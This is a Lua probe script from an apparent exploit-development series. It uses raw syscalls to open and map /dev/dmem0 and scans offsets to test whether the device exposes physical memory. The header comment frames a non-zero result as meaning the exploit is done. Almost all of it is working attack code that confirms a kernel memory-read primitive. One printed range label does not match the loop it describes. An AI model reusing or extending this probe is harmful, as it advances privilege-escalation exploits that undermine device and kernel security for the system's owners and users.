-- CRASH_CLASS: LOW -- read-only.  No store is issued.
-- PROBE 1397f: content map of the dmem window - is it a physical map or a zeroed arena?
--
-- 1397e settled the shape: page 0 is a static table (two mappings identical, unaffected by writes to
-- neighbouring pages), and the rungs are contiguous - a marker written at the 0x2000 rung appears at
-- M2+0x1000, so one mapping of length N covers N/0x1000 consecutive offsets.  Offsets up to
-- 0x100000000 map; 0x200000000 is refused with EACCES.
--
-- Everything sampled so far is zero except page 0 and a single dword at 0x10000+0x18.  That is the
-- whole question: a 4 GiB linear offset space whose pages are all zero is a dedicated zeroed arena,
-- but if any page carries real data, the offset is a physical address (in which case this node is a
-- physical memory window and the exploit is done).
--
-- Strategy: sample the low 1 MiB at page granularity, then the whole 4 GiB at 16 MiB granularity,
-- printing only pages with a non-zero dword.  A linear physical map cannot hide: kernel text, the
-- kernel heap, and every loaded module live somewhere in 0..4 GiB on this machine.
--
-- -- prior art:
--   results/phase36_realargs/1397e_dmem_page0_liveness_20261109_142921.txt (contiguous, static page 0)
--   results/phase36_realargs/1397d_dmem_extent_regs_20261109_142819.txt (4 GB of offsets, page-0 dump)
--   results/phase36_realargs/1397c_dmem_ladder_contents_20261109_142729.txt (all rungs writable)

print("=== PROBE 1397f: dmem CONTENT MAP ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function hex(v) return string.format("%08X", v) end
local function isva(v) return v > 0 and v < 0x8000000000 end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local function str_addr(s)
    local b = memory.alloc(#s + 1)
    for i = 1, #s do pcall(function() memory.write_byte(b + i - 1, uint64(s:byte(i))) end) end
    pcall(function() memory.write_byte(b + #s, uint64(0)) end)
    return b
end

local fd0 = N(mk(5)(uint64(str_addr("/dev/dmem0")), uint64(0x4002), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] dmem0 fd=%d", fd0))

-- One mapping of 1 MiB at offset 0 covers rungs 0..0xFF contiguously (1397e), so the low-1MiB scan
-- only needs a single mmap.
local BIG = N(mk(477)(uint64(0), uint64(0x100000), uint64(1), uint64(1), uint64(fd0), uint64(0)))
print(string.format("[0] low-1MiB map -> 0x%010X %s", BIG, es()))

local nz = 0
if isva(BIG) then
    print("")
    print("[A] non-zero pages in the low 1 MiB (page granularity)")
    for p = 0, 0xFF do
        local base = BIG + p * 0x1000
        local a, b, c, d = rd(base), rd(base + 4), rd(base + 8), rd(base + 0xC)
        if (a or 0) ~= 0 or (b or 0) ~= 0 or (c or 0) ~= 0 or (d or 0) ~= 0 then
            nz = nz + 1
            print(string.format("   page 0x%03X : %s %s %s %s", p, hex(a), hex(b), hex(c), hex(d)))
        end
    end
    print(string.format("   [A] %d of 256 pages non-zero", nz))
end

-- ---------------------------------------------------------------- B
print("")
print("[B] the whole 4 GiB at 16 MiB granularity")
local hits = 0
for step = 0, 255 do
    local off = step * 0x1000000
    local va = N(mk(477)(uint64(0), uint64(0x1000), uint64(1), uint64(1), uint64(fd0), uint64(off)))
    if isva(va) then
        local a, b, c, d = rd(va), rd(va + 4), rd(va + 8), rd(va + 0xC)
        if (a or 0) ~= 0 or (b or 0) ~= 0 or (c or 0) ~= 0 or (d or 0) ~= 0 then
            hits = hits + 1
            print(string.format("   off=0x%09X : %s %s %s %s", off, hex(a), hex(b), hex(c), hex(d)))
        end
    else
        print(string.format("   off=0x%09X -> refused %s", off, es()))
    end
end
print(string.format("   [B] %d of 256 sampled 16MiB rungs non-zero", hits))

-- ---------------------------------------------------------------- C
print("")
print("[C] dense pass over the first 0x40000, 0x1000 at a time (already covered, cheap confirmation)")
if isva(BIG) then
    local n2 = 0
    for p = 0x10, 0x3F do
        local base = BIG + p * 0x1000
        local a = rd(base)
        if (a or 0) ~= 0 then n2 = n2 + 1 end
    end
    print(string.format("   [C] %d of 64 pages non-zero between 0x100000 and 0x400000", n2))
end

print("")
print("[D] close")
print(string.format("   dmem0 -> %d", N(mk(6)(uint64(fd0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

print("")
print("=== PROBE 1397f COMPLETE ===")
